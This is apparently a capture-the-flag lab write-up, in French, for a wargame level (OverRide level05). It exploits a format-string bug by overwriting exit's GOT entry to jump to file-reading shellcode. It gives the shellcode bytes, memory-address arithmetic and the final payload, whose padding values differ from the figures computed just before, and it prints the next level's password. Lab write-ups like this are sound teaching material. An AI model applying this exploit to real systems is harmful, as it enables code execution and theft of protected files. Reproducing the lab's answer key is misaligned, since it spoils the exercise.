@@ -1,0 +1,78 @@
+1) Transfert du fichier avec SCP en utilisant un port spécifié :
+    scp -P 22222 level05@localhost:/home/users/level05/level05 .
+
+2) Explications du code decompile:
+    Le programme demande une entrée à l'utilisateur, convertit chaque lettre en minuscule, puis affiche la chaîne avec printf avant de terminer avec exit. 
+    L'utilisation directe de printf avec l'entrée utilisateur crée une vulnérabilité de type "format string". 
+    Cette vulnérabilité permettrait de réécrire l'adresse de la fonction exit dans la GOT en utilisant le spécificateur de format "%n"
+
+3) On va utiliser un file reader pour lire le fichier ".pass" a l'emplacement "/home/users/level06/", on va recuperer le shellcode qui nous permettrait de le faire et le stocker 
+    dans une variable d'environnement puis recuperer son adresse memoire.
+    Pour commencer, trouvons l'emplacement où écrire l'adresse notre shellcode :
+
+        level05@OverRide:~$ ./level05 
+        aaaabbbb%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x
+        aaaabbbb00000064.f7fcfac0.00000000.00000000.00000000.00000000.ffffffff.ffffd334.f7fdb000.61616161.62626262.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252
+
+    Les valeurs "a" et "b" correspondent aux décimales 0x61 et 0x62. En partant de la gauche, on voit qu'on peut écrire à la position 10 et 11 dans la pile. 
+    On peut donc utiliser ces positions pour écrire notre adresse avec %10$n pour la position 10, et ainsi de suite
+    On a egalement besoin de l'adresse d'exit dans la GOT :
+        level05@OverRide:~$ objdump -R level05 | grep exit
+        080497e0 R_386_JUMP_SLOT   exit
+    080497e0 est donc l'adresse
+
+4) Lire le contenu du fichier "/home/users/level06/.pass" :
+    * Tout d'abord, on commence par chercher notre file reader ici : https://shell-storm.org/shellcode/files/shellcode-73.html
+        "\x31\xc0\x31\xdb\x31\xc9\x31\xd2"
+        "\xeb\x32\x5b\xb0\x05\x31\xc9\xcd"
+        "\x80\x89\xc6\xeb\x06\xb0\x01\x31"
+        "\xdb\xcd\x80\x89\xf3\xb0\x03\x83"
+        "\xec\x01\x8d\x0c\x24\xb2\x01\xcd"
+        "\x80\x31\xdb\x39\xc3\x74\xe6\xb0"
+        "\x04\xb3\x01\xb2\x01\xcd\x80\x83"
+        "\xc4\x01\xeb\xdf\xe8\xc9\xff\xff"
+        "\xff"
+        "/etc/passwd"
+    * On remplace "/etc/passwd" par "/home/users/level06/.pass" et on cree notre variable d'environnement : 
+        export SHELLCODE=$(python -c 'print "\x90" * 1000 + "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level06/.pass"')
+        Le préfixe "\x90" * 1000 ajoute des instructions NOP (No Operation) pour que l'attaque ait plus de chance de reussir même si l'adresse exacte n'est pas parfaitement alignée
+
+    * On cree un petit programme C pour recuperer l'adresse mémoire de notre shellcode :
+        level05@OverRide:~$ echo '#include <stdio.h>
+        #include <stdlib.h>
+
+        int main ()
+        {
+        printf("SEHLLCODE adress is : %p\n", getenv("SHELLCODE"));
+        return 0;
+        }' > /tmp/getaddr.c
+        level05@OverRide:~$ gcc -m32 -o /tmp/getaddr /tmp/getaddr.c
+        level05@OverRide:~$ /tmp/./getaddr 
+        SEHLLCODE adress is : 0xffffd4c6
+    
+    * L'adresse 0xffffd4c6 est un grand nombre (4294956230 en décimal), donc pour l'écrire correctement en mémoire, il faut la diviser en deux parties :
+        - Partie basse (les 16 bits de poids faible) : 0xd4c6
+        - Partie haute (les 16 bits de poids élevé) : 0xffff
+        - Première écriture : exit (080497e0) : 0xd4c6 - 8
+        - Deuxième écriture : exit + 2 (080497e0 + 2) : 0xffff - 0xd4c6
+
+        level05@OverRide:~$ gdb -q --batch --ex "p /d (0xffffd4c6 >> 16)" --ex "p /d (0xffffd4c6 & 0xffff)"
+        $1 = 65535
+        $2 = 54470
+        54470 - 8 = 54462
+        65535 - 54470 = 11065
+
+      Pour atteindre la valeur 0xffff à la deuxième adresse, nous devons ajouter 11065 caractères supplémentaires après avoir écrit 0xd4c6
+
+    * On construit notre payload :
+        level05@OverRide:~$ python -c "print '\xe0\x97\x04\x08' + '\xe2\x97\x04\x08' + '%54447x' + '%10\$hn' + '%11080x' + '%11\$hn'" > /tmp/exploit05
+        level05@OverRide:~$ cat /tmp/exploit05 | ./level05
+        [...]
+        f7fcfac0
+        h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
+
+Ressources: 
+    https://shell-storm.org/shellcode/files/shellcode-73.html
+    https://www.exploit-db.com/exploits/14173
+    https://nuc13us.wordpress.com/2015/09/04/format-string-exploit-overwrite-got/
+    https://medium.com/@danielorihuelarodriguez/format-string-vulnerability-439acbe81ddf
